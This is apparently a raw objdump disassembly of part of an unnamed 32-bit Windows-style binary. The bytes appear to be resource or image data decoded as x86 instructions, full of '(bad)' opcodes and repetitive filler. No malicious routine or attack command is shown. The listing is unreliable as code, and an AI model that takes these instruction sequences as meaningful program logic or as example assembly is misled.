  405a1c:	xchg   ebp,eax
  405a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a1e:	test   eax,0x7a838a83
  405a23:	jle    0x405a9f
  405a25:	jb     0x4059b3
  405a27:	mov    eax,ds:0x98d3d2ce
  405a2c:	test   DWORD PTR [ecx+0x44],edx
  405a2f:	es adc eax,0x15141414
  405a35:	pop    ss
  405a36:	and    esp,DWORD PTR ds:0x25242523
  405a3c:	and    eax,0x69222525
  405a41:	in     al,dx
  405a42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a43:	xchg   ebp,eax
  405a44:	add    BYTE PTR [eax],al
  405a46:	add    BYTE PTR [eax],al
  405a48:	add    dh,dl
  405a4a:	aam    0xd4
  405a4c:	pushf  
  405a4d:	stos   BYTE PTR es:[edi],al
  405a4e:	int    0x83
  405a50:	mov    bl,BYTE PTR [edi-0x34347d81]
  405a56:	pushf  
  405a57:	test   BYTE PTR [edx+0x44],cl
  405a5a:	es push ss
  405a5c:	add    al,BYTE PTR [edx]
  405a5e:	add    al,BYTE PTR [edx]
  405a60:	adc    al,0x15
  405a62:	sbb    bl,BYTE PTR [edx]
  405a64:	pop    ss
  405a65:	and    al,0x2b
  405a67:	sub    ebp,DWORD PTR [ebx]
  405a69:	sub    edi,DWORD PTR [eax]
  405a6b:	cmp    BYTE PTR [eax],bh
  405a6d:	cmp    eax,0xec60333d
  405a72:	stos   BYTE PTR es:[edi],al
  405a73:	nop
  405a74:	add    BYTE PTR [eax],al
  405a76:	add    BYTE PTR [eax],al
  405a78:	add    bl,dl
  405a7a:	(bad)  
  405a7c:	pushf  
  405a7d:	stos   BYTE PTR es:[edi],al
  405a7e:	stos   BYTE PTR es:[edi],al
  405a7f:	nop
  405a80:	nop
  405a81:	lahf   
  405a82:	popf   
  405a83:	jns    0x405aae
  405a85:	es push ss
  405a87:	adc    al,0x2
  405a89:	add    al,BYTE PTR [edx]
  405a8b:	add    al,BYTE PTR [edx]
  405a8d:	push   ss
  405a8e:	adc    eax,0x3041517
  405a93:	pop    ss
  405a94:	sbb    al,0x25
  405a96:	cmp    al,0x3c
  405a98:	cmp    al,0x3e
  405a9a:	ds ds ds aas 
  405a9e:	aas    
  405a9f:	cmp    DWORD PTR [eax-0x22],esp
  405aa2:	(bad)  
  405aa3:	nop
  405aa4:	add    BYTE PTR [eax],al
  405aa6:	add    BYTE PTR [eax],al
  405aa8:	add    ah,dl
  405aaa:	aad    0xd5
  405aac:	lahf   
  405aad:	stos   BYTE PTR es:[edi],al
  405aae:	int    0x90
  405ab0:	nop
  405ab1:	lahf   
  405ab2:	mov    ds:0x16020286,al
  405ab7:	push   ss
  405ab8:	push   ss
  405ab9:	push   ss
  405aba:	push   ss
  405abb:	push   ss
  405abc:	adc    al,0x14
  405abe:	pop    ss
  405abf:	push   ss
  405ac0:	add    eax,0x1c039092
  405ac5:	cmp    al,0x56
  405ac7:	push   esi
  405ac8:	inc    eax
  405ac9:	inc    eax
  405aca:	push   edi
  405acb:	push   edi
  405acc:	push   edi
  405acd:	push   edi
  405ace:	pop    edx
  405acf:	aas    
  405ad0:	pop    edx
  405ad1:	fstp   st(5)
  405ad3:	mov    al,BYTE PTR [eax]
  405ad5:	add    BYTE PTR [eax],al
  405ad7:	add    BYTE PTR [eax],al
  405ad9:	rcl    ebp,cl
  405adb:	aad    0x9f
  405add:	stos   BYTE PTR es:[edi],al
  405ade:	int    0x94
  405ae0:	xchg   ebp,eax
  405ae1:	xchg   ebp,eax
  405ae2:	int    0x93
  405ae4:	push   ss
  405ae5:	sbb    DWORD PTR [eax],esp
  405ae7:	sbb    BYTE PTR [eax],bl
  405ae9:	push   ss
  405aea:	push   ss
  405aeb:	push   ss
  405aec:	adc    al,0x17
  405aee:	adc    eax,0xaaa99904
  405af3:	dec    esp
  405af4:	and    DWORD PTR [eax+0x59],eax
  405af7:	pop    ecx
  405af8:	pop    edx
  405af9:	pop    edx
  405afa:	pop    esp
  405afb:	pop    edx
  405afc:	pop    ebp
  405afd:	pop    esp
  405afe:	pop    ebp
  405aff:	pop    eax
  405b00:	pop    eax
  405b01:	fucom  st(0)
  405b03:	add    DWORD PTR [eax],0x0
  405b06:	add    BYTE PTR [eax],al
  405b08:	add    dh,dl
  405b0a:	aad    0xd7
  405b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b0d:	stos   BYTE PTR es:[edi],al
  405b0e:	rcl    DWORD PTR [ebp-0x5d31606e],cl
  405b14:	pop    ds
  405b15:	sbb    DWORD PTR [esi],esp
  405b17:	and    BYTE PTR [eax],ah
  405b19:	sbb    BYTE PTR [eax],bl
  405b1b:	push   ss
  405b1c:	adc    eax,0xe29b2817
  405b21:	fxch   st(5)
  405b23:	fldenv [edi]
  405b25:	pop    ecx
  405b26:	pop    esp
  405b27:	pop    esp
  405b28:	pop    esi
  405b29:	pop    esi
  405b2a:	pop    esi
  405b2b:	pop    esi
  405b2c:	pop    esi
  405b2d:	pop    esi
  405b2e:	arpl   WORD PTR [ebp+0x5d],bx
  405b31:	(bad)  
  405b32:	in     eax,dx
  405b33:	nop
  405b34:	add    BYTE PTR [eax],al
  405b36:	add    BYTE PTR [eax],al
  405b38:	add    dh,dl
  405b3a:	xlat   BYTE PTR ds:[ebx]
  405b3b:	int    0x90
  405b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b3e:	rcr    DWORD PTR [ebp+eiz*4+0x29ccd3aa],cl
  405b45:	sbb    DWORD PTR [edx],ebp
  405b47:	es es and BYTE PTR es:[edi],dl
  405b4c:	adc    al,0x5
  405b4e:	int    0xf4
  405b50:	out    0x88,al
  405b52:	mov    esi,0x614896e6
  405b57:	popa   
  405b58:	popa   
  405b59:	arpl   WORD PTR [ebx+0x63],sp
  405b5c:	push   0x6a
  405b5e:	imul   ebp,DWORD PTR [ebx+0x5d],0xffffffc1
  405b62:	in     eax,dx
  405b63:	xchg   ecx,eax
  405b64:	(bad)  
  405b65:	add    BYTE PTR [eax],al
  405b67:	add    BYTE PTR [eax],al
  405b69:	rcl    esp,cl
  405b6b:	mov    edi,0xa9dda587
  405b70:	test   eax,0x43d0d3aa
  405b75:	sbb    DWORD PTR [ebx],edi
  405b77:	sub    ch,BYTE PTR [edx]
  405b79:	sub    BYTE PTR [eax],ah
  405b7b:	push   ss
  405b7c:	sub    ebp,ebx
  405b7e:	cld    
  405b7f:	hlt    
  405b80:	dec    ecx
  405b81:	and    DWORD PTR [ebx-0x1a],edx
  405b84:	stc    
  405b85:	push   esp
  405b86:	bound  ebp,QWORD PTR [esp+ebp*2+0x6c]
  405b8a:	ins    BYTE PTR es:[edi],dx
  405b8b:	ins    BYTE PTR es:[edi],dx
  405b8c:	ins    DWORD PTR es:[edi],dx
  405b8d:	ins    DWORD PTR es:[edi],dx
  405b8e:	ins    BYTE PTR es:[edi],dx
  405b8f:	outs   dx,BYTE PTR ds:[esi]
  405b90:	pop    edi
  405b91:	mov    ebx,0xa595ed
  405b96:	add    BYTE PTR [eax],al
  405b98:	add    bl,dl
  405b9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b9c:	sbb    DWORD PTR [edi-0x32555523],0xffffffd6
  405ba3:	into   
  405ba4:	dec    ebp
  405ba5:	sbb    DWORD PTR [ebp+0x3b],eax
  405ba8:	cmp    edi,DWORD PTR [ebx]
  405baa:	pop    ss
  405bab:	pop    ds
  405bac:	mov    esi,0x1c50f1fc
  405bb1:	sbb    eax,0xe6f9c025
  405bb6:	push   edx
  405bb7:	lods   eax,DWORD PTR ds:[esi]
  405bb8:	lods   eax,DWORD PTR ds:[esi]
  405bb9:	lods   eax,DWORD PTR ds:[esi]
  405bba:	scas   al,BYTE PTR es:[edi]
  405bbb:	scas   al,BYTE PTR es:[edi]
  405bbc:	scas   al,BYTE PTR es:[edi]
  405bbd:	scas   al,BYTE PTR es:[edi]
  405bbe:	scas   al,BYTE PTR es:[edi]
  405bbf:	mov    ch,0x6b
  405bc1:	mov    cl,0xef
  405bc3:	test   eax,0x95
  405bc8:	add    dh,dl
  405bca:	mov    al,ds:0xdd9f8dbc
  405bcf:	rcl    ebx,cl
  405bd1:	(bad)  
  405bd2:	(bad)  
  405bd3:	fdiv   DWORD PTR [eax+0x18]
  405bd6:	inc    edi
  405bd7:	inc    esp
  405bd8:	inc    ebp
  405bd9:	sub    al,0x15
  405bdb:	pop    ss
  405bdc:	cmp    al,BYTE PTR [ebp+0x2d1d213a]
  405be2:	sbb    eax,0x9bfcf348
  405be7:	imul   ebp,DWORD PTR [esi-0x4c4a5051],0x6eb5b5b5
  405bf1:	scas   eax,DWORD PTR es:[edi]
  405bf2:	in     eax,dx
  405bf3:	lds    edx,FWORD PTR [edx+0x0]
  405bf9:	aam    0x89
  405bfb:	je     0x405b8c
  405bfd:	mov    esp,0xd9d3d9de
  405c02:	(bad)  
  405c04:	lea    ebx,[edi]
  405c06:	inc    edi
  405c07:	inc    edi
  405c08:	dec    eax
  405c09:	and    BYTE PTR ds:0x1c1c1c17,dl
  405c0f:	sbb    eax,0x2d2d2d1d
  405c14:	mov    edx,0xb484fcf9
  405c19:	mov    ch,0xb5
  405c1b:	mov    ch,0xb5
  405c1d:	mov    ch,0xb5
  405c1f:	ret    
  405c20:	scas   al,BYTE PTR es:[edi]
  405c21:	scas   eax,DWORD PTR es:[edi]
  405c22:	out    dx,eax
  405c23:	rcl    DWORD PTR [eax+0x0],cl
  405c29:	add    BYTE PTR [ebp+0x66],ah
  405c2c:	jae    0x405bea
  405c2e:	in     al,0xd9
  405c30:	(bad)  
  405c32:	(bad)  
  405c34:	pushf  
  405c35:	sub    BYTE PTR [eax+0x4b],cl
  405c38:	dec    ebx
  405c39:	pop    ss
  405c3a:	adc    eax,0x211c1c1c
  405c3f:	sbb    eax,0x332d2d2d
  405c44:	imul   ebx,ebx,0xc368f4f9
  405c4a:	ret    
  405c4b:	ret    
  405c4c:	(bad)
  405c50:	mov    ch,0xb3
  405c52:	out    0xdd,al
  405c54:	add    DWORD PTR [eax],0x0
  405c57:	add    BYTE PTR [eax],al
  405c59:	add    BYTE PTR [esi+eax*1+0x11],ah
  405c5d:	int    0xe3
  405c5f:	aad    0xdd
  405c61:	(bad)  
  405c63:	(bad)  [edx+0x4555472a]
  405c69:	adc    eax,0x1c1c1c17
  405c6e:	sbb    eax,0x2e322d2d
  405c73:	ss mov ch,0xb0
  405c76:	loop   0x405c71
  405c78:	int    0xac
  405c7a:	(bad)  
  405c7b:	(bad)  
  405c7c:	(bad)  
  405c7d:	leave  
  405c7e:	(bad)  
  405c7f:	retf   0xafc7
  405c82:	lock fnstsw WORD PTR [esi+0x0]
  405c86:	add    BYTE PTR [eax],al
  405c88:	add    BYTE PTR [eax],al
  405c8a:	or     al,BYTE PTR [ecx]
  405c8c:	bswap  ebp
  405c8e:	in     eax,0xde
  405c90:	aad    0xdd
  405c92:	fucom  st(6)
  405c94:	stos   BYTE PTR es:[edi],al
  405c95:	sub    cl,BYTE PTR [ebx+0x69]
  405c98:	and    BYTE PTR [edx],bl
  405c9a:	sbb    al,0x1c
  405c9c:	sbb    eax,0x32322d2d
  405ca1:	xor    al,0x30
  405ca3:	inc    ecx
  405ca4:	(bad)  
  405ca5:	leave  
  405ca6:	(bad)  
  405ca9:	xchg   edx,eax
  405cab:	retf   0xcaca
  405cae:	retf   0xcae7
  405cb1:	mov    bl,0xe3
  405cb3:	loop   0x405c38
  405cb5:	add    BYTE PTR [eax],al
  405cb7:	add    BYTE PTR [eax],al
  405cb9:	add    BYTE PTR [eax+ecx*1],cl
  405cbc:	jno    0x405c5d
  405cbe:	lock aad 0xdd
  405cc1:	fstp   st(5)
  405cc3:	out    0xc5,al
  405cc5:	sub    DWORD PTR [ebx+0x53],ecx
  405cc8:	sbb    al,0x1a
  405cca:	sbb    al,0x1d
  405ccc:	sbb    eax,0x32322e2d
  405cd1:	xor    al,0x30
  405cd3:	pop    edi
  405cd4:	out    0xe7,eax
  405cd6:	enter  0xd99b,0xe6
  405cda:	xchg   cl,cl
  405cdc:	out    0xe9,eax
  405cde:	jmp    0xdaf846cc
  405ce3:	out    dx,eax
  405ce4:	adc    esi,0x0
  405ce7:	add    BYTE PTR [eax],al
  405ce9:	add    BYTE PTR [edx+0x7e],bh
  405cec:	and    esi,0xfffffffc
  405cef:	cld    
  405cf0:	lock out 0xdd,al
  405cf3:	loop   0x405ccd
  405cf5:	inc    ebx
  405cf6:	dec    ebx
  405cf7:	inc    esi
  405cf8:	adc    eax,0x2d1d1c1c
  405cfd:	sub    eax,0x3032322e
  405d02:	xor    eax,0xe9e9ea6e
  405d07:	mov    ebx,0x86ddd3a7
  405d0c:	jmp    0xec2b47fb
  405d11:	(bad)  
  405d12:	enter  0x90f3,0xaa
  405d16:	add    BYTE PTR [eax],al
  405d18:	add    BYTE PTR [eax],al
  405d1a:	add    al,dh
  405d1c:	stos   BYTE PTR es:[edi],al
  405d1d:	fucomp st(7)
  405d1f:	stc    
  405d20:	cld    
  405d21:	cld    
  405d22:	cld    
  405d23:	hlt    
  405d24:	fimul  WORD PTR [esi+0x3b]
  405d27:	and    al,0x15
  405d29:	sbb    al,0x1d
  405d2b:	sbb    eax,0x322e2d2d
  405d30:	xor    al,0x34
  405d32:	aaa    
  405d33:	ret    
  405d34:	jmp    0x405d20
  405d36:	jmp    0xbe9f:0xd39cbaea
  405d3d:	jmp    0x405d2a
  405d3f:	jmp    0x405d2c
  405d41:	leave  
  405d42:	enter  0x95f7,0xa9
	...
  405d4e:	(bad)  [edx-0x3061d23]
  405d54:	in     eax,0x84
  405d56:	adc    eax,0x1d1c1c1a
  405d5b:	sbb    eax,0x32322e2d
  405d60:	xor    eax,0xf5e74134
  405d65:	jmp    0x9ba7:0xbaeaeaea
  405d6c:	call   0xf72c495c
  405d71:	retf   0xf9c8
  405d74:	test   eax,0x92
	...
  405d81:	(bad)  [edx+0x28bddd6]
  405d87:	sbb    bl,BYTE PTR [esp+ebx*1]
  405d8a:	sbb    eax,0x322e2e1d
  405d8f:	xor    dh,BYTE PTR [esi*1-0x150a14a1]
  405d96:	cmc    
  405d97:	jmp    0x405d8e
  405d99:	jmp    0x405d86
  405d9b:	cmc    
  405d9c:	jmp    0x405d94
  405d9e:	div    dh
  405da0:	cli    
  405da1:	jmp    0x405d6b
  405da3:	sti    
  405da4:	(bad)  
  405da5:	nop
	...
  405db2:	add    BYTE PTR [eax],al
  405db4:	fcomp  DWORD PTR [esi+edx*1+0x1d1c1c15]
  405dbb:	sub    eax,0x34322e2d
  405dc0:	xor    eax,0xf5f66e34
  405dc5:	cmc    
  405dc6:	cmc    
  405dc7:	cmc    
  405dc8:	div    dh
  405dca:	div    dh
  405dcc:	cmc    
  405dcd:	jmp    0x405dba
  405dcf:	jmp    0x405dba
  405dd1:	(bad)  
  405dd2:	mov    dl,0xf9
  405dd4:	loop   0x405e50
	...
  405de2:	add    BYTE PTR [eax],al
  405de4:	add    BYTE PTR [ecx+0x211a1a16],ch
  405dea:	sbb    eax,0x32312e1d
  405def:	xor    al,0x35
  405df1:	aaa    
  405df2:	(bad)  
  405df3:	cld    
  405df4:	cmc    
  405df5:	jmp    0x405de1
  405df7:	jmp    0xc80a28e3
  405dfc:	(bad)  
  405dfd:	mov    dh,0xb6
  405dff:	ret    0xc8c8
  405e02:	enter  0xf0f9,0x7f
	...
  405e12:	add    BYTE PTR [eax],al
  405e14:	add    dh,cl
  405e16:	sub    DWORD PTR ds:0x2d1d1d1d,edx
  405e1c:	xor    ch,BYTE PTR [esi]
  405e1e:	xor    BYTE PTR [eax],dh
  405e20:	das    
  405e21:	xor    eax,0xb4afb66d
  405e26:	mov    ah,0xb9
  405e28:	mov    ebx,0xdac8c8c6
  405e2d:	fcmovu st,st(3)
  405e2f:	out    0xe6,al
  405e31:	out    0xf2,al
  405e33:	xrelease lock add BYTE PTR [eax],al
	...
  405e43:	add    BYTE PTR [eax],al
  405e45:	rol    DWORD PTR [edx+0x1a],1
  405e48:	sbb    bl,BYTE PTR [ebx]
  405e4a:	sbb    ebx,DWORD PTR [ebx]
  405e4c:	sbb    eax,0x53593e25
  405e51:	stos   DWORD PTR es:[edi],eax
  405e52:	mov    ebx,0xddddd5c1
  405e57:	fstp   st(5)
  405e59:	loop   0x405e3c
  405e5b:	in     eax,0xe6
  405e5d:	lock xrelease add BYTE PTR [eax],al
	...
  405e75:	into   
  405e76:	dec    edi
  405e77:	daa    
  405e78:	inc    ebx
  405e79:	push   esp
  405e7a:	mov    BYTE PTR [ecx-0x21212e59],dl
  405e80:	loope  0x405e67
  405e82:	fsubrp st(2),st
  405e84:	out    0xe6,al
  405e86:	lock add BYTE PTR [eax],al
	...
  405ea5:	stos   BYTE PTR es:[edi],al
  405ea6:	(bad)  
  405ea7:	rcr    dh,cl
  405ea9:	(bad)  
  405eab:	in     al,0xe4
  405ead:	out    0xef,al
	...
  405ed3:	add    BYTE PTR [eax],al
  405ed5:	add    dh,ah
	...
  405fb7:	add    bh,bh
  405fb9:	(bad)  
  405fba:	(bad)  
  405fbb:	(bad)  
  405fbc:	(bad)  
  405fbd:	inc    DWORD PTR [eax]
  405fbf:	add    bh,bh
  405fc1:	(bad)  
  405fc2:	(bad)  
  405fc3:	(bad)  
  405fc4:	(bad)  
  405fc5:	inc    DWORD PTR [eax]
  405fc7:	add    bh,bh
  405fc9:	(bad)  
  405fca:	(bad)  
  405fcb:	(bad)  
  405fcc:	(bad)  
  405fcd:	inc    DWORD PTR [eax]
  405fcf:	add    bh,bh
  405fd1:	(bad)  
  405fd2:	inc    DWORD PTR [eax+0xffff]
  405fd8:	(bad)  
  405fd9:	(bad)  
  405fda:	cld    
  405fdb:	add    BYTE PTR [edi],cl
  405fdd:	inc    DWORD PTR [eax]
  405fdf:	add    bh,bh
  405fe1:	push   eax
  405fe3:	add    BYTE PTR [ebx],al
  405fe5:	inc    DWORD PTR [eax]
  405fe7:	add    bh,bh
  405fe9:	inc    eax
  405feb:	add    BYTE PTR [ecx],al
  405fed:	inc    DWORD PTR [eax]
  405fef:	add    bh,bh
  405ff1:	inc    DWORD PTR [eax+0xff0000]
  405ff7:	add    bh,bh
  405ff9:	inc    DWORD PTR [eax+0xff0000]
  405fff:	add    bh,bh
  406001:	inc    DWORD PTR [eax+0xff0000]
  406007:	add    bh,bh
  406009:	inc    DWORD PTR [eax+0xff0000]
  40600f:	add    bl,ah
  406011:	inc    eax
  406013:	add    BYTE PTR [eax],al
  406015:	lahf   
  406016:	add    BYTE PTR [eax],al
  406018:	rol    BYTE PTR [edi],0xe0
  40601b:	add    BYTE PTR [eax],al
  40601d:	pop    ds
  40601e:	add    BYTE PTR [eax],al
  406020:	add    BYTE PTR [ecx],0xf8
  406023:	add    BYTE PTR [eax],al
  406025:	pop    ds
  406026:	add    BYTE PTR [eax],al
  406028:	add    BYTE PTR [eax],0x7f
  40602b:	add    BYTE PTR [eax],al
  40602d:	pop    ds
  40602e:	add    BYTE PTR [eax],al
  406030:	add    BYTE PTR [eax],0x1c
  406033:	add    BYTE PTR [eax],al
  406035:	sldt   WORD PTR [eax]
  406038:	add    BYTE PTR [eax],0x0
  40603b:	add    BYTE PTR [eax],al
  40603d:	sldt   WORD PTR [eax]
  406040:	add    BYTE PTR [eax],0x0
  406043:	add    BYTE PTR [eax],al
  406045:	sldt   WORD PTR [eax]
  406048:	add    BYTE PTR [eax],0x0
  40604b:	add    BYTE PTR [eax],al
  40604d:	sldt   WORD PTR [eax]
  406050:	add    BYTE PTR [eax],0x0
  406053:	add    BYTE PTR [eax],al
  406055:	sldt   WORD PTR [eax]
  406058:	add    BYTE PTR [eax],0x0
  40605b:	add    BYTE PTR [eax],al
  40605d:	sldt   WORD PTR [eax]
  406060:	add    BYTE PTR [eax],0x0
  406063:	add    BYTE PTR [eax],al
  406065:	sldt   WORD PTR [eax]
  406068:	add    BYTE PTR [eax],0x0
  40606b:	add    BYTE PTR [eax],al
  40606d:	sldt   WORD PTR [eax]
  406070:	add    BYTE PTR [eax],0x0
  406073:	add    BYTE PTR [eax],al
  406075:	sldt   WORD PTR [eax]
  406078:	add    BYTE PTR [eax],0x0
  40607b:	add    BYTE PTR [eax],al
  40607d:	pop    es
  40607e:	add    BYTE PTR [eax],al
  406080:	add    BYTE PTR [eax],0x0
  406083:	add    BYTE PTR [eax],al
  406085:	pop    es
  406086:	add    BYTE PTR [eax],al
  406088:	add    BYTE PTR [eax],0x0
  40608b:	add    BYTE PTR [eax],al
  40608d:	pop    es
  40608e:	add    BYTE PTR [eax],al
  406090:	add    BYTE PTR [eax],0x0
  406093:	add    BYTE PTR [eax],al
  406095:	pop    es
  406096:	add    BYTE PTR [eax],al
  406098:	add    BYTE PTR [eax],0x0
  40609b:	add    BYTE PTR [eax],al
  40609d:	pop    es
  40609e:	add    BYTE PTR [eax],al
  4060a0:	rol    BYTE PTR [eax],0x0
  4060a3:	add    BYTE PTR [eax],al
  4060a5:	pop    es
  4060a6:	add    BYTE PTR [eax],al
  4060a8:	rol    BYTE PTR [eax],0x0
  4060ab:	add    BYTE PTR [eax],al
  4060ad:	pop    es
  4060ae:	add    BYTE PTR [eax],al
  4060b0:	rol    BYTE PTR [eax],0x0
  4060b3:	add    BYTE PTR [eax],al
  4060b5:	pop    es
  4060b6:	add    BYTE PTR [eax],al
  4060b8:	rol    BYTE PTR [eax],0x0
  4060bb:	add    BYTE PTR [eax],al
  4060bd:	add    eax,DWORD PTR [eax]
  4060bf:	add    al,al
  4060c1:	add    BYTE PTR [eax],al
  4060c3:	add    BYTE PTR [eax],al
  4060c5:	add    eax,DWORD PTR [eax]
  4060c7:	add    al,ah
  4060c9:	add    BYTE PTR [eax],al
  4060cb:	add    BYTE PTR [eax],al
  4060cd:	add    eax,DWORD PTR [eax]
  4060cf:	add    ah,bh
  4060d1:	add    BYTE PTR [eax],al
  4060d3:	add    BYTE PTR [eax],al
  4060d5:	add    eax,DWORD PTR [eax]
  4060d7:	add    bh,bh
  4060d9:	add    BYTE PTR [eax],0x0
  4060dc:	add    BYTE PTR [ebx],al
  4060de:	add    BYTE PTR [eax],al
  4060e0:	push   eax
  4060e2:	add    BYTE PTR [eax],al
  4060e4:	add    BYTE PTR [ebx],al
  4060e6:	add    BYTE PTR [eax],al
  4060e8:	(bad)  
  4060e9:	clc    
  4060ea:	add    BYTE PTR [eax],al
  4060ec:	add    BYTE PTR [ebx],al
  4060ee:	add    BYTE PTR [eax],al
  4060f0:	(bad)  
  4060f1:	clc    
  4060f2:	add    BYTE PTR [eax],al
  4060f4:	add    BYTE PTR [edi],al
  4060f6:	add    BYTE PTR [eax],al
  4060f8:	(bad)  
  4060f9:	clc    
  4060fa:	add    BYTE PTR [eax],al
  4060fc:	add    edi,edi
  4060fe:	add    BYTE PTR [eax],al
  406100:	(bad)  
  406101:	clc    
  406102:	add    BYTE PTR [ecx],al
  406104:	(bad)  
  406105:	inc    DWORD PTR [eax]
  406107:	add    bh,bh
  406109:	clc    
  40610a:	add    edi,edi
  40610c:	(bad)  
  40610d:	inc    DWORD PTR [eax]
  40610f:	add    bh,bh
  406111:	std    
  406112:	(bad)  
  406113:	(bad)  
  406114:	(bad)  
  406115:	inc    DWORD PTR [eax]
  406117:	add    bh,bh
  406119:	(bad)  
  40611a:	(bad)  
  40611b:	(bad)  
  40611c:	(bad)  
  40611d:	inc    DWORD PTR [eax]
  40611f:	add    bh,bh
  406121:	(bad)  
  406122:	(bad)  
  406123:	(bad)  
  406124:	(bad)  
  406125:	inc    DWORD PTR [eax]
  406127:	add    bh,bh
  406129:	(bad)  
  40612a:	(bad)  
  40612b:	(bad)  
  40612c:	(bad)  
  40612d:	inc    DWORD PTR [eax]
  40612f:	add    bh,bh
  406131:	(bad)  
  406132:	(bad)  
  406133:	(bad)  
  406134:	(bad)  
  406135:	inc    DWORD PTR [eax]
  406137:	add    BYTE PTR [eax],ch
  406139:	add    BYTE PTR [eax],al
  40613b:	add    BYTE PTR [eax],ah
  40613d:	add    BYTE PTR [eax],al
  40613f:	add    BYTE PTR [eax+0x0],al
  406142:	add    BYTE PTR [eax],al
  406144:	add    DWORD PTR [eax],eax
  406146:	or     BYTE PTR [eax],al
  406148:	add    BYTE PTR [eax],al
  40614a:	add    BYTE PTR [eax],al
  40614c:	add    BYTE PTR [eax+eax*1],al
	...
  406157:	add    BYTE PTR [eax],al
  406159:	add    DWORD PTR [eax],eax
  40615b:	add    BYTE PTR [eax],al
  40615d:	add    DWORD PTR [eax],eax
  40615f:	add    BYTE PTR [eax],al
  406161:	add    BYTE PTR [eax],al
  406163:	add    BYTE PTR [eax+eax*1+0x0],dh
  406167:	add    BYTE PTR [eax+eax*1+0x0],bh
  40616b:	add    BYTE PTR [edi+0x1d],dh
  40616e:	push   ss
  40616f:	add    BYTE PTR [edi+0x22],dh
  406172:	sbb    DWORD PTR [eax],eax
  406174:	jns    0x40619a
  406176:	sbb    al,BYTE PTR [eax]
  406178:	inc    edi
  406179:	es sub eax,0x222b6f00
  40617f:	add    BYTE PTR [edi+ebp*1+0x2a],bh
  406183:	add    BYTE PTR [eax],al
  406185:	jnp    0x4061c0
  406187:	add    BYTE PTR [ecx+0x49],cl
  40618a:	dec    ecx
  40618b:	add    BYTE PTR [ebx+0x52],dl
  40618e:	push   edx
  40618f:	add    BYTE PTR [edx+0x5f],bh
  406192:	add    BYTE PTR [bx+0x66],ah
  406196:	data16 add BYTE PTR [ecx+0x69],ch
  40619a:	imul   eax,DWORD PTR [eax],0x697862
  4061a0:	je     0x406215
  4061a2:	je     0x4061a4
  4061a4:	jp     0x40621a
  4061a6:	ja     0x4061a8
  4061a8:	jns    0x406223
  4061aa:	jnp    0x4061ac
  4061ac:	add    DWORD PTR [eax],0x0
  4061af:	add    BYTE PTR [ebx-0x74000000],cl
  4061b5:	or     al,0x5
  4061b7:	add    BYTE PTR [eax-0x64fffefe],dl
  4061bd:	add    DWORD PTR [eax],eax
  4061bf:	add    BYTE PTR [ecx+ecx*1+0x148b0000],bl
  4061c6:	or     DWORD PTR [eax],eax
  4061c8:	nop
  4061c9:	adc    DWORD PTR [ebx],eax
  4061cb:	add    BYTE PTR [ecx-0x71fffff0],bl
  4061d1:	adc    dl,BYTE PTR [ebx]
  4061d3:	add    BYTE PTR [esi-0x6affeee6],cl
  4061d9:	sbb    DWORD PTR [edx],edx
  4061db:	add    BYTE PTR [ecx-0x51000000],ah
  4061e1:	add    eax,0xba20000
  4061e6:	add    BYTE PTR [eax],al
  4061e8:	stos   DWORD PTR es:[edi],eax
  4061e9:	or     eax,DWORD PTR [eax]
  4061eb:	add    BYTE PTR [esi-0x5afffef6],dh
  4061f1:	adc    DWORD PTR [eax],eax
  4061f3:	add    BYTE PTR [edx-0x52ffffeb],ch
  4061f9:	sbb    BYTE PTR [ecx],al
  4061fb:	add    BYTE PTR [ebx-0x4afff5e3],ch
  406201:	push   ss
  406202:	add    BYTE PTR [eax],al
  406204:	mov    ch,0x19
  406206:	add    BYTE PTR [eax],al
  406208:	mov    ebp,0xb800001a
  40620d:	push   ss
  40620e:	or     eax,DWORD PTR [eax]
  406210:	mov    ch,0x1e
  406212:	or     eax,DWORD PTR [eax]
  406214:	(bad)  
  406215:	and    DWORD PTR [edx],ebx
  406217:	add    BYTE PTR [edx-0x5dffe2d8],dl
  40621d:	sub    DWORD PTR [edi],edx
  40621f:	add    BYTE PTR [edx-0x42ffe7d4],dh
  406225:	sub    al,0x1c
  406227:	add    BYTE PTR [edi-0x78ffe2cf],ch
  40622d:	sub    ah,BYTE PTR [eax+eax*1]
  406230:	xchg   ebp,eax
  406231:	sub    esp,DWORD PTR [eax+eax*1]
  406234:	xchg   esp,eax
  406235:	xor    ch,BYTE PTR [ecx]
  406237:	add    BYTE PTR [ebx-0x67ffcecc],dl
  40623d:	xor    eax,0x3a9c0033
  406242:	xor    al,0x0
  406244:	mov    ds:0xad00202b,al
  406249:	and    eax,DWORD PTR ss:[eax]
  40624c:	mov    bh,0x3d
  40624e:	sub    eax,DWORD PTR [eax]
  406250:	mov    ebp,0xab002b3d
  406255:	xor    eax,0xac60033
  40625a:	add    BYTE PTR [eax],al
  40625c:	aam    0xa
  40625e:	add    BYTE PTR [eax],al
  406260:	lds    ebx,FWORD PTR [ecx+eax*1]
  406263:	add    cl,ch
  406265:	pop    es
  406266:	add    BYTE PTR [eax],al
  406268:	lock push cs
  40626a:	add    BYTE PTR [eax],al
  40626c:	jecxz  0x406285
  40626e:	add    BYTE PTR [eax],al
  406270:	iret   
  406271:	and    BYTE PTR [eax],al
  406273:	add    bh,dl
  406275:	and    eax,DWORD PTR [eax]
  406277:	add    al,cl
  406279:	sub    DWORD PTR [eax],edx
  40627b:	add    bl,ah
  40627d:	and    BYTE PTR [eax],al
  40627f:	add    bh,dh
  406281:	sub    DWORD PTR [edx],eax
  406283:	add    BYTE PTR [ebp-0x3bffc2be],dl
  406289:	inc    edx
  40628a:	sub    al,0x0
  40628c:	(bad)  
  40628d:	inc    esp
  40628e:	sub    eax,0x394ac800
  406293:	add    cl,dl
  406295:	push   edx
  406296:	ds add ah,dh
  406299:	dec    edx
  40629a:	sub    BYTE PTR [eax],al
  40629c:	nop
  40629d:	inc    ebx
  40629e:	inc    esp
  40629f:	add    BYTE PTR [ebx-0x70ffbab2],dl
  4062a5:	pop    ebp
  4062a6:	pop    eax
  4062a7:	add    BYTE PTR [ebx-0x5affaca7],bl
  4062ad:	dec    ecx
  4062ae:	inc    edx
  4062af:	add    BYTE PTR [ecx-0x4fffb3ad],ch
  4062b5:	push   edx
  4062b6:	dec    ecx
